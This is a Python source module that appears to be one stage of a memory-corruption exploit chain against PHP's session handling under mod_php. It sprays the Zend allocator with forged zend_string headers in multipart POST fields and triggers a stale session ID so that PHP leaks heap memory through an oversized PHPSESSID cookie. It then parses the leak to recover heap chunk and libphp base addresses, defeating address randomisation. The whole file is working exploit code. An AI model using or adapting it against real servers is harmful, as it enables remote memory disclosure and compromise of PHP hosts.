#!/usr/bin/env python3
"""modphp-a1b1 stale-PS(id) Set-Cookie disclosure consumer.

It assumes an A1 request has already left PS(id), PS(mod_data), and
PS(send_cookie) stale in the same worker.  It performs no process-map or
debugger read: candidate bases are derived only from the HTTP Set-Cookie value.
"""

from __future__ import annotations

from collections import Counter
import re
import socket
import urllib.parse

from .schema import AbiLayout, AllocatorLayout, B1ReleasePlan


def unsigned_at(data: bytes, offset: int, size: int, byte_order: str) -> int:
    return int.from_bytes(data[offset : offset + size], byte_order)


def store_unsigned(data: bytearray, offset: int, value: int, size: int, byte_order: str) -> None:
    data[offset : offset + size] = value.to_bytes(size, byte_order, signed=False)


def part(boundary: bytes, name: bytes, value: bytes) -> bytes:
    return (
        b"--" + boundary + b"\r\n"
        + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        + value + b"\r\n"
    )


def forged_value(
    id_offset: int,
    fake_len: int,
    fill: int,
    data_start: int,
    allocation_pages: int | None = None,
    *,
    abi: AbiLayout | None = None,
    allocator: AllocatorLayout | None = None,
    gc_refcount: int | None = None,
    gc_type: int | None = None,
    string_hash: int | None = None,
    marker: bytes | None = None,
) -> bytes:
    """Fill a large zend_string value and place another zend_string at id_offset.

    Large request values are represented as zend_string allocations whose data
    starts at chunk+data_start in the tested 64-bit ZendMM layout.  The stale
    PS(id) points to chunk+id_offset, so the nested fake header begins at the
    corresponding offset inside attacker-controlled string data.
    """
    if abi is None or allocator is None:
        raise ValueError("abi and allocator are required")
    if gc_refcount is None or gc_type is None or string_hash is None or marker is None:
        raise ValueError("forged string metadata and marker are required")

    header_at = id_offset - data_start
    if header_at < 0:
        raise ValueError("id_offset precedes controlled data")
    total = header_at + abi.string_data_offset + len(marker)
    if allocation_pages is not None:
        if allocation_pages < 1:
            raise ValueError("allocation_pages must be positive")
        # A request value is retained as a zend_string: 24-byte header, data,
        # and trailing NUL.  This length fills an integral number of LRUN pages
        # after allocator rounding while leaving the fake header at id_offset.
        total = max(total, allocation_pages * allocator.page_size - (abi.string_data_offset + 1))
    value = bytearray(bytes([fill]) * total)
    store_unsigned(value, header_at + abi.string_gc_refcount_offset,
                   gc_refcount, 4, abi.byte_order)
    store_unsigned(value, header_at + abi.string_gc_type_offset,
                   gc_type, 4, abi.byte_order)
    store_unsigned(value, header_at + abi.string_hash_offset,
                   string_hash, abi.pointer_size, abi.byte_order)
    store_unsigned(value, header_at + abi.string_length_offset,
                   fake_len, abi.pointer_size, abi.byte_order)
    marker_at = header_at + abi.string_data_offset
    value[marker_at : marker_at + len(marker)] = marker
    return bytes(value)


def make_body(
    boundary: bytes,
    id_offset: int,
    fake_len: int,
    sprays: int,
    data_start: int,
    nested_fields: int,
    nested_depth: int,
    small_fields: int,
    small_name_size: int,
    small_value_size: int,
    small_after_nested: bool,
    page_spec: tuple[int | None, ...],
    tail_pages: int | None,
    release_sprays: bool | B1ReleasePlan,
    carrier_sprays: int,
    carrier_pages: int,
    *,
    abi: AbiLayout | None = None,
    allocator: AllocatorLayout | None = None,
    gc_refcount: int | None = None,
    gc_type: int | None = None,
    string_hash: int | None = None,
    marker: bytes | None = None,
) -> bytes:
    body = bytearray()
    for index in range(sprays):
        pages = tail_pages if tail_pages is not None and index == sprays - 1 else page_spec[index % len(page_spec)]
        value = forged_value(
            id_offset, fake_len, 0x41 + index % 20, data_start, pages,
            abi=abi, allocator=allocator, gc_refcount=gc_refcount,
            gc_type=gc_type, string_hash=string_hash, marker=marker,
        )
        body += part(boundary, f"g{index:03d}".encode(), value)

    # A full-page first pass can safely paint an A1-stale ps_files::basedir
    # zend_string header with a byte whose GC_IMMUTABLE bit is set.  Replacing
    # those retained POST values frees the chunks without erasing their bytes;
    # shorter carriers can then reclaim the stale ID while leaving room for
    # natural HashTables (and their pDestructor code pointers) after it.
    if isinstance(release_sprays, B1ReleasePlan):
        release_indices = release_sprays.spray_indices
        post_release_pages = release_sprays.post_release_pages
    else:
        release_indices = range(sprays) if release_sprays else ()
        post_release_pages = ()
    for index in release_indices:
        body += part(boundary, f"g{index:03d}".encode(), b"r")
    for index, pages in enumerate(post_release_pages):
        value_length = pages * allocator.page_size - (abi.string_data_offset + 1)
        body += part(boundary, f"h{index:03d}".encode(), b"H" * value_length)
    for index in range(carrier_sprays):
        value = forged_value(
            id_offset, fake_len, 0x61 + index % 20, data_start, carrier_pages,
            abi=abi, allocator=allocator, gc_refcount=gc_refcount,
            gc_type=gc_type, string_hash=string_hash, marker=marker,
        )
        body += part(boundary, f"c{index:03d}".encode(), value)

    def add_small_fields() -> None:
        for index in range(small_fields):
            prefix = f"s{index:05d}".encode()
            name = (prefix + b"N" * small_name_size)[:small_name_size]
            body.extend(part(boundary, name, b"V" * small_value_size))

    if not small_after_nested:
        add_small_fields()

    # Natural HashTables placed after the large allocations carry a real
    # pDestructor pointer.  When they occupy holes covered by the disclosure
    # window, repeated code pointers can identify zval_ptr_dtor/libphp.
    suffix = b"[a]" * nested_depth
    for index in range(nested_fields):
        body += part(boundary, f"x{index:04d}".encode() + suffix, b"v")

    if small_after_nested:
        add_small_fields()

    # No file part: END cleanup reaches php_session_initialize before normal
    # session RINIT, so it consumes A1's stale globals.
    body += part(boundary, b"PHPSESSID", b"a")
    body += part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    body += b"--" + boundary + b"--\r\n"
    return bytes(body)


def chunked_post(
    host: str,
    port: int,
    path: str,
    body: bytes,
    boundary: bytes,
    *,
    chunk_size: int = 262144,
    host_header: str | None = None,
    timeout: float = 90.0,
) -> bytes:
    if chunk_size < 1:
        raise ValueError("chunk_size must be positive")
    authority = host if host_header is None else host_header
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {authority}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    sock = socket.create_connection((host, port), timeout=timeout)
    response = bytearray()
    try:
        sock.settimeout(timeout)
        sock.sendall(request)
        view = memoryview(body)
        for offset in range(0, len(body), chunk_size):
            chunk = view[offset : offset + chunk_size]
            sock.sendall(f"{len(chunk):x}\r\n".encode())
            sock.sendall(chunk)
            sock.sendall(b"\r\n")
        sock.sendall(b"0\r\n\r\n")
        try:
            while True:
                block = sock.recv(65536)
                if not block:
                    break
                response.extend(block)
        except (TimeoutError, OSError):
            pass
    finally:
        sock.close()
    return bytes(response)


def decode_cookie(response: bytes) -> bytes:
    """Return the longest PHPSESSID header, decoded without response-body data.

    A worker can have more than one Set-Cookie header queued.  The forged ID is
    unambiguously the longest one, while a normal PHP session ID is short.
    PHP's URL encoder emits an ASCII-only value, so rejecting any
    non-ASCII header also prevents an accidental lossy Unicode conversion.
    """
    head = response.partition(b"\r\n\r\n")[0]
    encoded = re.findall(rb"(?im)^Set-Cookie:[ \t]*PHPSESSID=([^;\r\n]*)", head)
    decoded: list[bytes] = []
    for value in encoded:
        try:
            text = value.decode("ascii")
        except UnicodeDecodeError:
            continue
        # PHP serialises the cookie value with application/x-www-form-urlencoded
        # semantics: an original space byte is emitted as a literal '+', while
        # an original plus byte is emitted as "%2B".  unquote_to_bytes() alone
        # leaves '+' untouched and silently corrupts disclosed pointers whose
        # byte representation contains 0x20 (for example an AArch64 function
        # address ending in ...20).  Restore the space before percent decoding.
        decoded.append(urllib.parse.unquote_to_bytes(text.replace("+", " ")))
    return max(decoded, key=len, default=b"")


def is_user_pointer(value: int, allocator: AllocatorLayout | None = None) -> bool:
    if allocator is None:
        raise ValueError("allocator is required")
    return allocator.user_pointer_min <= value < allocator.user_pointer_max


def pointer_records(
    data: bytes,
    stride: int,
    abi: AbiLayout | None = None,
    allocator: AllocatorLayout | None = None,
) -> list[tuple[int, int]]:
    if abi is None or allocator is None:
        raise ValueError("abi and allocator are required")
    records: list[tuple[int, int]] = []
    for offset in range(0, len(data) - abi.pointer_size + 1, stride):
        value = unsigned_at(data, offset, abi.pointer_size, abi.byte_order)
        if is_user_pointer(value, allocator):
            records.append((offset, value))
    return records


def find_chunk_headers(
    data: bytes,
    id_offset: int,
    abi: AbiLayout | None = None,
    allocator: AllocatorLayout | None = None,
) -> list[dict[str, int | str]]:
    """Recognise leaked ZendMM chunk headers and recover the true main chunk.

    Every chunk begins with `heap`, `next`, and `prev`.  `heap` points to the
    heap_slot at main_chunk+0x40, while next/prev are 2 MiB-aligned chunk
    addresses.  This is stronger evidence than pointer-density clustering:
    the densest cluster is often merely the chunk containing the disclosure.
    """
    if abi is None or allocator is None:
        raise ValueError("abi and allocator are required")
    alignment = allocator.chunk_alignment
    mask = alignment - 1
    found: list[dict[str, int | str]] = []
    first_boundary = alignment - ((id_offset + abi.string_data_offset) & mask)
    expected_boundaries = set(
        range(first_boundary, len(data) - allocator.chunk_header_size + 1, alignment)
    )
    limit = len(data) - allocator.chunk_header_size + 1
    for offset in range(0, limit, allocator.pointer_alignment):
        heap = unsigned_at(
            data, offset + allocator.chunk_heap_offset,
            abi.pointer_size, abi.byte_order,
        )
        next_chunk = unsigned_at(
            data, offset + allocator.chunk_next_offset,
            abi.pointer_size, abi.byte_order,
        )
        prev_chunk = unsigned_at(
            data, offset + allocator.chunk_prev_offset,
            abi.pointer_size, abi.byte_order,
        )
        free_pages = unsigned_at(
            data, offset + allocator.chunk_free_pages_offset, 4, abi.byte_order,
        )
        free_tail = unsigned_at(
            data, offset + allocator.chunk_free_tail_offset, 4, abi.byte_order,
        )
        number = unsigned_at(
            data, offset + allocator.chunk_number_offset, 4, abi.byte_order,
        )
        if not is_user_pointer(heap, allocator):
            continue
        main = heap - allocator.heap_slot_from_main
        if main <= 0 or main & mask:
            continue
        if not (
            is_user_pointer(next_chunk, allocator)
            and is_user_pointer(prev_chunk, allocator)
        ):
            continue
        strict_links = not (next_chunk & mask or prev_chunk & mask)
        boundary_links = (
            offset in expected_boundaries
            and not (next_chunk & (allocator.page_size - 1))
            and not (prev_chunk & (allocator.page_size - 1))
        )
        if not strict_links and not boundary_links:
            continue
        # Despite the historical comment in zend_alloc.c, free_tail is the
        # first page number of the still-unallocated tail, not a count.  A
        # nearly full chunk can therefore legitimately be (3, 509).
        if free_pages > allocator.max_free_pages or not (
            allocator.min_free_tail <= free_tail <= allocator.max_free_tail
        ):
            continue
        if number > allocator.max_chunk_number:
            continue
        found.append({
            "cookie_offset": offset,
            "main_base": main,
            "next_chunk": next_chunk,
            "prev_chunk": prev_chunk,
            "free_pages": free_pages,
            "free_tail": free_tail,
            "chunk_number": number,
            "evidence": "aligned_links" if strict_links else "expected_2m_boundary",
        })
    return found


def analyse(
    data: bytes,
    dtor_offset: int,
    id_offset: int,
    *,
    abi: AbiLayout | None = None,
    allocator: AllocatorLayout | None = None,
    marker: bytes | None = None,
) -> dict[str, object]:
    if abi is None or allocator is None:
        raise ValueError("abi and allocator are required")
    if marker is None:
        raise ValueError("marker is required")
    # zend_string::val is pointer aligned, hence aligned slots are the high
    # confidence set.  The byte-wise pass is retained only as a diagnostic for
    # structures that happen not to begin at an aligned disclosure offset.
    aligned_records = pointer_records(data, allocator.pointer_alignment, abi, allocator)
    all_records = pointer_records(data, 1, abi, allocator)
    aligned = Counter(value for _, value in aligned_records)
    unaligned = Counter(value for _, value in all_records)

    clusters: Counter[int] = Counter()
    cluster_unique: dict[int, set[int]] = {}
    for _, value in aligned_records:
        base = value & ~(allocator.chunk_alignment - 1)
        clusters[base] += 1
        cluster_unique.setdefault(base, set()).add(value)

    heap_candidates = []
    for base, slots in clusters.most_common(16):
        # Heap pointers are normally at least 8-byte aligned.  Code pointers
        # may be 4-byte aligned on AArch64 and remain useful to libphp scoring.
        heap_slots = sum(count for value, count in aligned.items()
                         if base <= value < base + allocator.chunk_alignment
                         and value % allocator.pointer_alignment == 0)
        heap_candidates.append({
            "base": base,
            "slots": slots,
            "heap_aligned_slots": heap_slots,
            "unique": len(cluster_unique[base]),
            "leak_start_if_stale_chunk": base + id_offset + abi.string_data_offset,
        })

    repeated = [(value, count) for value, count in aligned.most_common(32) if count >= 2]

    # zval_ptr_dtor is stored as HashTable.pDestructor and is therefore often
    # repeated.  A true hit gives a page-aligned image base after subtracting
    # the independently known symbol offset.  Rank it further by all aligned
    # pointers landing in a conservative 32 MiB image window.
    libphp = []
    for value, exact_count in aligned.items():
        base = value - dtor_offset
        if base <= 0 or base & (allocator.image_alignment - 1):
            continue
        image_slots = sum(count for candidate, count in aligned.items()
                          if base <= candidate < base + allocator.image_window)
        libphp.append({
            "base": base,
            "zval_ptr_dtor": value,
            "exact_slots": exact_count,
            "image_slots": image_slots,
            "score": exact_count * 16 + image_slots,
        })
    libphp.sort(key=lambda item: (item["score"], item["exact_slots"]), reverse=True)

    chunk_headers = find_chunk_headers(data, id_offset, abi, allocator)
    main_counts = Counter(item["main_base"] for item in chunk_headers)
    # A unique structural candidate is safe to hand to the callback. Pointer cluster
    # rank alone deliberately never populates this field.
    request_main_base = next(iter(main_counts)) if len(main_counts) == 1 else None
    main_recovery = "chunk_header" if request_main_base is not None else None

    # A profile whose stale ID is inside the persistent main chunk cannot
    # disclose that chunk's header with a forward string leak.  Such profiles
    # may explicitly allow one uniquely dense and address-diverse pointer
    # cluster as alternate main evidence.  Zero thresholds keep the stricter
    # chunk-header-only behaviour for all existing profiles.
    if request_main_base is None and allocator.main_cluster_min_slots > 0:
        dense = [
            item for item in heap_candidates
            if item["slots"] >= allocator.main_cluster_min_slots
            and item["unique"] >= allocator.main_cluster_min_unique
            and item["unique"] / item["slots"]
            >= allocator.main_cluster_min_unique_ratio
        ]
        if len(dense) == 1:
            request_main_base = dense[0]["base"]
            main_recovery = "profile_dense_pointer_cluster"

    return {
        "decoded": len(data),
        "marker_ok": data.startswith(marker),
        "aligned_pointer_slots": len(aligned_records),
        "bytewise_pointer_slots": len(all_records),
        "clusters": clusters.most_common(16),
        "heap_candidates": heap_candidates,
        "chunk_headers": chunk_headers,
        "main_candidates": main_counts.most_common(),
        "request_main_candidates": main_counts.most_common(),
        "request_main_base": request_main_base,
        "main_recovery": main_recovery,
        "repeated": repeated,
        "libphp_candidates": libphp[:16],
    }



